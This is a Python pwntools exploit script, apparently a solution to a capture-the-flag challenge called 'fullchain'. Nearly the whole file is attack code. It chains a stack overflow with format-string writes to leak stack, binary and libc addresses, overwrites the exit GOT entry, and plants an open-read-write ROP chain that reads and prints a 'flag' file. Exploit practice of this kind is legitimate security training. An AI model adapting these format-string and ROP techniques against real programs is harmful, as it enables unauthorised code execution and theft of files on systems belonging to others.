from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
init-pwndbg
# b global
# b 94
# b 50
# b 61
"""

if len(sys.argv) > 1:
    # p = gdb.debug("./fullchain", gdbscript=script, level="debug")
    p = gdb.debug("./fullchain", gdbscript=script, level="info")
else:
    p = process("./fullchain")

def write_data(addr, data):
    for i, byte in enumerate(data):
        p.sendlineafter(b"global or local > ", b"local")
        p.sendlineafter(b"set, read or write > ", b"read")
        p.sendline(flat(b"a" * 0x10, addr+i))

        p.sendlineafter(b"global or local > ", b"global")
        p.sendlineafter(b"set, read or write > ", b"read")
        pl = f"%{int(byte)}c%16$hhn" if byte else b"%16$hhn"
        p.sendline(pl)

        p.sendlineafter(b"global or local > ", b"global")
        p.sendlineafter(b"set, read or write > ", b"write")
        # log.info(f"write {hex(byte)} at {hex(addr+i)}")
        # time.sleep(0.05)

local_to_cnt = 0x20 - 0x14

# local_addr
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"write%10$p")
p.recvuntil(b"write0x")
stack_addr = int(p.recv(12), 16)
cnt_addr = stack_addr - 0x4e0 + 0x4b4
ptr_addr = cnt_addr + 0x4
local_addr = stack_addr - 0x4e0 + 0x4c0
log.info(f"stack_addr: {hex(stack_addr)}")
log.info(f"cnt_addr: {hex(cnt_addr)}")
log.info(f"local_addr: {hex(local_addr)}")

# cnt set
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"read")
pl = flat(b"a" * 0x10, cnt_addr)
p.sendline(pl)
log.info("local overflow")

p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"write%16$n")
log.info("cnt set 5")

# cnt set big
# write_data(cnt_addr, flat(10000))

p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"read")
pl = flat(b"a" * 0x10, cnt_addr)
p.sendline(pl)
log.info("local overflow")

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"read")
p.sendline(b"%10000c%16$hn")
log.info("global read")

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"write")
log.info("cnt set big")

# leak got
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"write%11$p")
p.recvuntil(b"write0x")
chal_addr = int(p.recv(12), 16) - 358
base_addr = chal_addr - 0x15c7
global_addr = base_addr + 0x40b0

printf_got = base_addr + 0x4048
puts_got = base_addr + 0x4030
stack_check_fail_got = base_addr + 0x4040
memset_got = base_addr + 0x4058
exit_got = base_addr + 0x4070

log.info(f"base_addr: {hex(base_addr)}") # 000
log.info(f"chal_addr: {hex(chal_addr)}") # 5c7
log.info(f"global_addr: {hex(global_addr)}") # 0b0
log.info(f"exit_got: {hex(exit_got)}") # 070

# overwrite exit
leave_ret = 0x147c + base_addr
log.info(f"leave_ret: {hex(leave_ret)}") # 47c
write_data(exit_got, flat(leave_ret))
log.info(f"write {hex(leave_ret)} at {hex(exit_got)}")

# leak libc
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"read")
pl = flat(b"a" * 0x10, printf_got)
p.sendline(pl)
log.info("local overflow")

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"read")
p.sendline(b"%16$s")
log.info("global read")

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"write")
printf_addr = p.recv(6)
printf_addr = int.from_bytes(printf_addr, byteorder='little')
libc_addr = printf_addr - 0x5a850
log.info(f"printf_addr: {hex(printf_addr)}") # 850
log.info(f"libc_addr: {hex(libc_addr)}")

# ROP
pop_rax_ret = 0x0000000000041770 + libc_addr
pop_rdi_ret = 0x0000000000029835 + libc_addr
pop_rsi_ret = 0x000000000002b151 + libc_addr
pop_rdx_rbx_ret = 0x00000000000884a9 + libc_addr
syscall_ret = 0x0000000000089386 + libc_addr
leave_ret = 0x0000000000050c27 + libc_addr
log.info(f"syscall_ret: {hex(syscall_ret)}") # 386
log.info(f"leave_ret: {hex(leave_ret)}") #c27

flag_dir = global_addr+0x100
write_data(global_addr+0x100, b"flag")
log.info(f"flag_dir: {hex(flag_dir)}") #c27
# input()

big_read = flat(
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, global_addr+0x50,
    pop_rdx_rbx_ret, 0xf0, 0,
    syscall_ret, 
)

orw = flat(
    pop_rax_ret, 2,
    pop_rdi_ret, flag_dir,
    pop_rsi_ret, 0,
    syscall_ret, 

    pop_rax_ret, 0,
    pop_rdi_ret, 3,
    pop_rsi_ret, local_addr,
    pop_rdx_rbx_ret, 0x20, 0,
    syscall_ret, 

    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    syscall_ret, 
)

write_data(stack_addr+8, orw)
log.info(f"write orw rop at stack: {hex(stack_addr+8)}")
# input()

# cnt set 0
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"read")
pl = flat(b"a" * 0x10, cnt_addr)
p.sendline(pl)
log.info("local overflow")

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"read")
p.sendline(b"%16$n")
log.info("global read")

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"write")
log.info("cnt set 0")

log.info(p.recvlineS())
p.interactive()
